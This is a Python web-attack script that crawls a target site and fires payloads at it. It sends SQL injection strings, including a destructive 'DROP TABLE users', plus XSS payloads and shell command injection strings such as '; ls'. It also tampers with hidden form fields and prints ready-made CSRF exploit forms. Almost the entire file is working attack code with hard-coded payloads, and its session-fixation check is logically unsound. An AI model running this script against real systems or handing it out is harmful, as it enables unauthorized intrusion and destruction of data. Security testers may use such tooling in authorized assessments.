import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlencode

# Global settings
TARGET_URL = "http://example.com"  # Replace with the actual target or use a test environment
SESSION = requests.Session()

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
}

### 1. Web Application Mapping ###
def map_application(url):
    urls_to_visit = [url]
    visited_urls = set()

    print(f"Starting mapping of {url}")
    
    while urls_to_visit:
        current_url = urls_to_visit.pop(0)
        try:
            response = SESSION.get(current_url, headers=HEADERS)
            soup = BeautifulSoup(response.text, "html.parser")

            for link in soup.find_all("a", href=True):
                full_url = urljoin(url, link["href"])
                if full_url not in visited_urls and full_url.startswith(url):
                    visited_urls.add(full_url)
                    urls_to_visit.append(full_url)
        except requests.RequestException as e:
            print(f"Error accessing {current_url}: {e}")

    print(f"Mapping complete. Found {len(visited_urls)} URLs.")
    return list(visited_urls)


### 2. Bypassing Client-Side Controls ###
def bypass_client_side_controls(url, payload):
    try:
        response = SESSION.get(url, headers=HEADERS)
        soup = BeautifulSoup(response.text, "html.parser")

        for form in soup.find_all("form"):
            data = {}
            action = form.get("action")
            full_url = urljoin(url, action)

            for input_tag in form.find_all("input"):
                input_name = input_tag.get("name")
                input_type = input_tag.get("type", "text")
                input_value = input_tag.get("value", "")

                if input_type == "hidden":
                    data[input_name] = payload
                else:
                    data[input_name] = input_value

            post_response = SESSION.post(full_url, headers=HEADERS, data=data)
            print(f"Submitted form to {full_url} with manipulated hidden fields. Response code: {post_response.status_code}")
    except Exception as e:
        print(f"Error during client-side control bypass: {e}")


### 3. Advanced SQL Injection Testing ###
def test_sql_injection(url, param_name):
    payloads = ["' OR '1'='1", "' OR 1=1 --", "' OR 'a'='a", "' UNION SELECT null --", "'; DROP TABLE users --"]

    for payload in payloads:
        params = {param_name: payload}
        full_url = f"{url}?{urlencode(params)}"
        response = SESSION.get(full_url, headers=HEADERS)
        
        if "syntax error" in response.text.lower() or "database error" in response.text.lower():
            print(f"Potential SQL Injection vulnerability found with payload: {payload}")
        else:
            print(f"Tested payload: {payload} - No vulnerability detected")


### 4. Advanced XSS Testing ###
def test_xss(url, param_name):
    xss_payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "<body onload=alert('XSS')>",
        "';alert(String.fromCharCode(88,83,83))//"
    ]
    for payload in xss_payloads:
        params = {param_name: payload}
        full_url = f"{url}?{urlencode(params)}"
        response = SESSION.get(full_url, headers=HEADERS)

        if payload in response.text:
            print(f"XSS vulnerability found on {url} with payload: {payload}")
        else:
            print(f"Tested XSS payload: {payload} - No vulnerability detected")


### 5. CSRF Detection and Exploitation ###
def test_csrf(url):
    try:
        response = SESSION.get(url, headers=HEADERS)
        soup = BeautifulSoup(response.text, "html.parser")
        forms = soup.find_all("form")
        
        for form in forms:
            action = form.get("action")
            full_url = urljoin(url, action)

            # Check for CSRF tokens
            csrf_token = any(input_tag for input_tag in form.find_all("input") if "csrf" in input_tag.get("name", "").lower())

            if not csrf_token:
                print(f"CSRF vulnerability detected on {full_url}")
                
                # Generate a simple CSRF exploit form
                print(f"Generating CSRF exploit for {full_url}:\n")
                print(f'<form method="POST" action="{full_url}">')
                for input_tag in form.find_all("input"):
                    if input_tag.get("type") == "hidden":
                        print(f'<input type="hidden" name="{input_tag.get("name")}" value="{input_tag.get("value")}">')
                print('<input type="submit" value="Exploit CSRF">')
                print('</form>\n')
            else:
                print(f"CSRF token detected, likely protected: {full_url}")
    except Exception as e:
        print(f"Error during CSRF test: {e}")


### 6. Command Injection Testing ###
def test_command_injection(url, param_name):
    command_injection_payloads = ["; ls", "&& ls", "| ls", "`ls`"]

    for payload in command_injection_payloads:
        params = {param_name: payload}
        full_url = f"{url}?{urlencode(params)}"
        response = SESSION.get(full_url, headers=HEADERS)

        # Check for common responses that may indicate command execution
        if "bin" in response.text or "root" in response.text or "etc" in response.text:
            print(f"Potential Command Injection vulnerability found with payload: {payload}")
        else:
            print(f"Tested Command Injection payload: {payload} - No vulnerability detected")


### 7. Session Management - Basic Session Fixation ###
def test_session_fixation(url):
    response = SESSION.get(url, headers=HEADERS)
    
    # Extract session cookie if it exists
    session_cookie = SESSION.cookies.get("sessionid")  # Replace "sessionid" with actual session cookie name

    if session_cookie:
        print(f"Original session ID: {session_cookie}")

        # Fixate session by resetting the cookie to the original
        SESSION.cookies.set("sessionid", session_cookie)
        test_response = SESSION.get(url, headers=HEADERS)

        if test_response.status_code == 200:
            print("Session fixation vulnerability may be present.")
        else:
            print("Session fixation test completed without issues.")
    else:
        print("No session cookie found. Unable to test session fixation.")


### Main Script ###
if __name__ == "__main__":
    # Step 1: Map the Application
    urls = map_application(TARGET_URL)
    print("Mapped URLs:", urls)

    # Step 2: Bypass Client-Side Controls
    if urls:
        bypass_client_side_controls(urls[0], payload="bypassed")

    # Step 3: Advanced SQL Injection
    test_sql_injection(TARGET_URL, "id")

    # Step 4: Advanced XSS
    test_xss(TARGET_URL, "search")

    # Step 5: CSRF Detection and Exploitation
    test_csrf(TARGET_URL)

    # Step 6: Command Injection
    test_command_injection(TARGET_URL, "cmd")

    # Step 7: Session Management - Session Fixation
    test_session_fixation(TARGET_URL)

